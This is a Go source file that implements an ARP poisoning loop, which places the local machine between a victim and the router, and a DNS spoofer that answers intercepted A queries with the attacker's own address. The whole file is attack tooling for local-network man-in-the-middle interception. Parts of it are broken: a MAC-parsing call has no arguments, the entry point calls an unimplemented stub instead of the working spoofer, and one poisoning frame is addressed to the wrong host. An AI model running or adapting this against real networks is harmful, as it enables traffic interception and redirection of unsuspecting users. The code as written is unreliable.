package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func spoofStr(dev string) {
	panic("unimplemented")
}

func arpPoison(device string, routerMac net.HardwareAddr, routerIP net.IP, localMac net.HardwareAddr, localIP net.IP, victimMac net.HardwareAddr, victimIP net.IP) {

	// Open NIC at layer 2
	handle, err := pcap.OpenLive(device, 1024, false, pcap.BlockForever)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer handle.Close()

	// create an empty ethernet packet
	ethernetPacket := layers.Ethernet{}
	// create an empty ARP packet
	arpPacket := layers.ARP{}
	// pre populate Arp Packet Info
	arpPacket.AddrType = layers.LinkTypeEthernet
	arpPacket.HwAddressSize = 6
	arpPacket.ProtAddressSize = 4
	arpPacket.Operation = 2
	arpPacket.Protocol = 0x0800

	// continiously put arp responses on the wire to ensure a good posion.
	for {
		/******** posion arp from victim to local ********/

		//set the ethernet packets' source mac address
		ethernetPacket.SrcMAC = localMac

		//set the ethernet packets' destination mac address
		ethernetPacket.DstMAC = victimMac

		//set the ethernet packets' type as ARP
		ethernetPacket.EthernetType = layers.EthernetTypeARP

		// create a buffer
		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{}

		// customize ARP Packet info

		arpPacket.SourceHwAddress = localMac
		arpPacket.SourceProtAddress = routerIP
		arpPacket.DstHwAddress = victimMac
		arpPacket.DstProtAddress = victimIP

		// set options for serializing (this probably isn't needed for an ARP packet)

		// serialize the data (serialize PREPENDS the data)
		err = arpPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		err = ethernetPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		// turn the packet into a byte array
		packetData := buf.Bytes()

		//remove padding and write to the wire
		handle.WritePacketData(packetData[:42])
		//Sleep so we don't flood with ARPS
		time.Sleep(50 * time.Millisecond)
		/******** end posion arp from victim to local ********/

		/******** posion arp from router to local ********/

		//set the ethernet packets' source mac address
		ethernetPacket.SrcMAC = localMac

		//set the ethernet packets' destination mac address
		ethernetPacket.DstMAC = victimMac

		//set the ethernet packets' type as ARP
		ethernetPacket.EthernetType = layers.EthernetTypeARP

		// customize ARP Packet info

		arpPacket.SourceHwAddress = localMac
		arpPacket.SourceProtAddress = victimIP
		arpPacket.DstHwAddress = routerMac
		arpPacket.DstProtAddress = routerIP

		// set options for serializing (this probably isn't needed for an ARP packet)

		// serialize the data (serialize PREPENDS the data)
		err = arpPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		err = ethernetPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		// turn the packet into a byte array
		packetData = buf.Bytes()

		//remove padding and write to the wire
		handle.WritePacketData(packetData[:42])
		/******** end posion arp from router to local ********/

		//Sleep so we don't flood with ARPS
		time.Sleep(5 * time.Second)
	}
}

func getIfaceAddr(ifacename string) net.IP {

	// get the list of interfaces
	ifaces, err := net.Interfaces()
	if err != nil {
		panic(err)
	}

	// loop through them to get our local address
	for i := range ifaces {

		// check it's the interface we want
		if ifaces[i].Name != ifacename {
			continue
		}

		// get the addresses
		addrs, err := ifaces[i].Addrs()
		if err != nil {
			panic(err)
		}

		// check to ensure there is an address on this interface
		if len(addrs) < 1 {
			panic("No address on target interface")
		}

		// use the first available address
		ip, _, err := net.ParseCIDR(addrs[0].String())
		if err != nil {
			panic(err)
		}

		return ip

	}
	return nil
}

/*
Spoof is the entry point for the actual spoofing subroutine.
Spoof handles getting packets from the NICs, identifying DNS
queries, and sending responses. It is mostly concerened with
the packet level logic, and does not manipulate the responses
themselves
*/
func spoof(ifacename string) {

	// get our local ip
	ip := getIfaceAddr(ifacename)
	if ip == nil {
		panic("Unable to get IP")
	}

	// open a handle to the network card(s)
	ifaceHandle, err := pcap.OpenLive(ifacename, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}

	defer ifaceHandle.Close()

	// set the filter
	err = ifaceHandle.SetBPFFilter("udp and dst port 53")
	if err != nil {
		// not fatal
		fmt.Printf("Unable to set filter: %v\n", err.Error())
	}

	// pre-allocate all the space needed for the layers
	var ethLayer layers.Ethernet
	var ipv4Layer layers.IPv4
	var udpLayer layers.UDP
	var dnsLayer layers.DNS

	var q layers.DNSQuestion
	var a layers.DNSResourceRecord

	// create the decoder for fast-packet decoding
	// (using the fast decoder takes about 10% the time of normal decoding)
	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)

	// this slick will hold the names of the layers successfully decoded
	decodedLayers := make([]gopacket.LayerType, 0, 4)

	// pre-create the response with most of the data filled out
	a.Type = layers.DNSTypeA
	a.Class = layers.DNSClassIN
	a.TTL = 300
	a.IP = ip

	// create a buffer for writing output packet
	outbuf := gopacket.NewSerializeBuffer()
	// TODO (Optionally) replace with NewSerializeBufferExpectedSize to speed up a bit more

	// set the arguments for serialization
	serialOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	// pre-allocate loop counter
	var i uint16

	// swap storage for ip and udp fields
	var ipv4Addr net.IP
	var udpPort layers.UDPPort
	var ethMac net.HardwareAddr

	// Main loop for dns packets intercepted
	// No new allocations after this point to keep garbage collector
	// cycles at a minimum
	for {
		packetData, _, err := ifaceHandle.ZeroCopyReadPacketData()

		if err != nil {
			break
		}

		fmt.Println("Got packet from filter")

		// decode this packet using the fast decoder
		err = decoder.DecodeLayers(packetData, &decodedLayers)
		if err != nil {
			fmt.Println("Decoding error!")
			continue
		}

		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			continue
		}

		// check that this is not a response
		if dnsLayer.QR {
			continue
		}

		// print the question section
		for i = 0; i < dnsLayer.QDCount; i++ {
			fmt.Println(string(dnsLayer.Questions[i].Name))
		}

		// set this to be a response
		dnsLayer.QR = true

		// if recursion was requested, it is available
		if dnsLayer.RD {
			dnsLayer.RA = true
		}

		// for each question
		for i = 0; i < dnsLayer.QDCount; i++ {

			// get the question
			q = dnsLayer.Questions[i]

			// verify this is an A-IN record question
			if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
				continue
			}

			// copy the name across to the response
			a.Name = q.Name

			// append the answer to the original query packet
			dnsLayer.Answers = append(dnsLayer.Answers, a)
			dnsLayer.ANCount = dnsLayer.ANCount + 1

		}

		// swap ethernet macs
		ethMac = ethLayer.SrcMAC
		ethLayer.SrcMAC = ethLayer.DstMAC
		ethLayer.DstMAC = ethMac

		// swap the ip
		ipv4Addr = ipv4Layer.SrcIP
		ipv4Layer.SrcIP = ipv4Layer.DstIP
		ipv4Layer.DstIP = ipv4Addr

		// swap the udp ports
		udpPort = udpLayer.SrcPort
		udpLayer.SrcPort = udpLayer.DstPort
		udpLayer.DstPort = udpPort

		// set the UDP to be checksummed by the IP layer
		err = udpLayer.SetNetworkLayerForChecksum(&ipv4Layer)
		if err != nil {
			panic(err)
		}

		// serialize packets
		err = gopacket.SerializeLayers(outbuf, serialOpts, &ethLayer, &ipv4Layer, &udpLayer, &dnsLayer)
		if err != nil {
			panic(err)
		}

		// write packet
		err = ifaceHandle.WritePacketData(outbuf.Bytes())
		if err != nil {
			panic(err)
		}

		fmt.Println("Response sent")

		// DEBUG-------------------------------------------------------------

		err = decoder.DecodeLayers(outbuf.Bytes(), &decodedLayers)
		if err != nil {
			fmt.Println("Decoding error: " + err.Error())
			continue
		}

		// only proceed if all layers decoded
		if len(decodedLayers) != 4 {
			fmt.Println("Not enough layers!")
			for j := range decodedLayers {
				fmt.Println(decodedLayers[j])
			}
			continue
		}

		// print packet
		fmt.Printf("IP src %v\n", ipv4Layer.SrcIP)
		fmt.Printf("IP dst %v\n", ipv4Layer.DstIP)
		fmt.Printf("UDP src port: %v\n", udpLayer.SrcPort)
		fmt.Printf("UDP dst port: %v\n", udpLayer.DstPort)
		fmt.Printf("DNS Quy count: %v\n", dnsLayer.QDCount)
		// print the question section
		for i = 0; i < dnsLayer.QDCount; i++ {
			fmt.Printf("%v\n", string(dnsLayer.Questions[i].Name))
		}
		fmt.Printf("DNS Ans count: %v\n", dnsLayer.ANCount)

		// print the question section
		for i = 0; i < dnsLayer.ANCount; i++ {
			fmt.Printf("%v type %v\n", string(dnsLayer.Answers[i].Name), dnsLayer.Answers[i].Type)
			fmt.Printf("\t%v\n", dnsLayer.Answers[i].IP)
		}

		break

	}
}

func arp_tsunami() {
	if os.Geteuid() != 0 {
		fmt.Println("arp poison mode requires root!")
		return
	}

	var dev = "eno1"

	fmt.Println("Running arp poison")
	// fill in with proper addresses here
	routerMac, err := net.ParseMAC()
	routerIP := net.IP{}
	localMac, err := net.ParseMAC()
	localIP := net.IP{}
	victimMac, err := net.ParseMAC()
	victimIP := net.IP{}
	/********* end parse all IP's and MAC's relevent for poisoning / spoofing *********/

	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	go arpPoison(dev, routerMac, routerIP, localMac, localIP, victimMac, victimIP)

	fmt.Println("Running spoofer")
	spoofStr(dev)
}
